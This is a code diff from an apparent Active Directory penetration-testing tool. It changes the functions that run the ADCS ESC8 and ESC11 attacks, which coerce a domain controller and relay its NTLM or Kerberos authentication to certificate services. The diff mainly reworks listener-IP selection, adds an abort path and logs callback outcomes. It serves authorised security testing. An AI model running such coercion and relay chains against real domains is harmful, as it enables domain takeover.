@@ -3,7 +3,6 @@
 from __future__ import annotations
 
 import asyncio
-import socket
 from dataclasses import dataclass
 from pathlib import Path
 
@@ -13,6 +12,11 @@ from adscan_core.rich_output import print_info_debug
 from adscan_internal.rich_output import mark_sensitive, print_info
 from adscan_internal.services.adcs.esc_cleanup import register_issued_certificate
 from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
+from adscan_internal.services.listener_ip import (
+    ListenerIpSelection,
+    report_callback_outcome,
+    resolve_listener_ip,
+)
 from adscan_internal.services.adcs_web_enrollment_probe import (
     ADCSWebEnrollmentProbe,
     WebEnrollmentProbeResult,
@@ -249,7 +253,10 @@ def _esc8_not_viable_result(technique: str, reason: str) -> EscResult:
 async def run_esc8(config: EscConfig) -> EscResult:
     """Run native ESC8: coerce a DC and relay NTLM to ADCS Web Enrollment."""
 
-    listener_host = _listener_host(config)
+    listener = _listener_host(config)
+    if not listener.ip:
+        return _listener_unresolved_result("ESC8: ADCS Web Enrollment", 8, listener)
+    listener_host = listener.ip
     output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc8"
     template = config.template or "DomainController"
 
@@ -292,7 +299,10 @@ async def run_esc8(config: EscConfig) -> EscResult:
 async def run_esc11(config: EscConfig) -> EscResult:
     """Run native ESC11: coerce a DC and relay NTLM to MS-ICPR."""
 
-    listener_host = _listener_host(config)
+    listener = _listener_host(config)
+    if not listener.ip:
+        return _listener_unresolved_result("ESC11: MS-ICPR (RPC/DCOM)", 11, listener)
+    listener_host = listener.ip
     output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc11"
     template = config.template or "DomainController"
 
@@ -352,6 +362,7 @@ async def _run_adcs_relay_chain(config: EscConfig, listener_host: str, target):
         coercion_target_host=config.dc_ip,
         coercion_target_name=config.dc_ip,
         config=NativeCoerceRelayConfig(
+            shell=config.shell,
             listener_host=listener_host,
             relay=NativeRelayRunConfig(
                 source=_RELAY_SOURCE,
@@ -392,7 +403,10 @@ async def run_esc8_krb(config: EscConfig) -> EscResult:
 
     No computer account creation, no SPN write — DNS-only setup.
     """
-    listener_host = _listener_host(config)
+    listener = _listener_host(config)
+    if not listener.ip:
+        return _listener_unresolved_result("ESC8: Kerberos relay", 8, listener)
+    listener_host = listener.ip
     output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc8_krb"
     template = config.template or "DomainController"
 
@@ -547,12 +561,14 @@ async def _run_adcs_smb_krb_relay_chain(
             spnego_bytes = await asyncio.wait_for(capture_queue.get(), timeout=120.0)
         except asyncio.TimeoutError:
             coercion_task.cancel()
+            _report_krb_callback(config, listener_host, arrived=False)
             return _KrbRelayChainResult(
                 relay_result=RelayRunResult(results=(), timed_out=True, authentications_seen=0),
                 coercion_success=False,
                 coercion_attempts=0,
             )
 
+        _report_krb_callback(config, listener_host, arrived=True)
         relay_result_item = await target.run(spnego_bytes)
         coercion_task.cancel()
     finally:
@@ -567,6 +583,20 @@ async def _run_adcs_smb_krb_relay_chain(
         coercion_success=True,
         coercion_attempts=1,
     )
+
+
+def _report_krb_callback(config: EscConfig, listener_host: str, *, arrived: bool) -> None:
+    """Record/advise on the callback for the Kerberos relay's own listener."""
+
+    try:
+        report_callback_outcome(
+            config.shell,
+            advertised_ip=listener_host,
+            target=config.dc_ip,
+            arrived=arrived,
+        )
+    except Exception as exc:  # noqa: BLE001 - evidence must never fail the chain
+        print_info_debug(f"callback outcome not recorded: {type(exc).__name__}")
 
 
 async def _coerce_smb_krb(config: EscConfig, factory, coerce_listener_name: str) -> None:
@@ -756,16 +786,34 @@ def _relay_chain_to_esc_result(
     )
 
 
-def _listener_host(config: EscConfig) -> str:
-    shell = config.shell
-    candidate = (
-        str(getattr(shell, "myip", "") or "").strip() if shell is not None else ""
+def _listener_host(config: EscConfig) -> ListenerIpSelection:
+    """Choose the IP advertised to the coerced DC (``config.dc_ip``).
+
+    Chosen per target through the listener-IP SSOT: the DC must reach us, so the
+    egress/route toward the DC (not toward the CA) decides, unless the operator
+    declared ``myip``. Never raises; check ``selection.ip``.
+    """
+    return resolve_listener_ip(config.shell, target=config.dc_ip)
+
+
+def _listener_unresolved_result(
+    technique: str, esc: int, selection: ListenerIpSelection
+) -> EscResult:
+    """Build the honest EscResult for a step aborted before coercion.
+
+    No listener address could be determined, so nothing was coerced and nothing
+    changed on the domain. This is OUR data gap, not a verdict about the client's
+    CA, so it deliberately does NOT carry ``not_viable`` (which asserts there is
+    no vulnerability). It is announced once, here.
+    """
+    reason = selection.failure_message()
+    print_relay_not_viable(technique=technique, reason=reason)
+    return EscResult(
+        success=False,
+        esc=esc,
+        error=reason,
+        evidence={"listener_unresolved": True, "coercion_attempted": False},
     )
-    if candidate:
-        return candidate
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-        sock.connect((config.dc_ip, 445))
-        return str(sock.getsockname()[0])
 
 
 def _secret_type(secret: str) -> str:
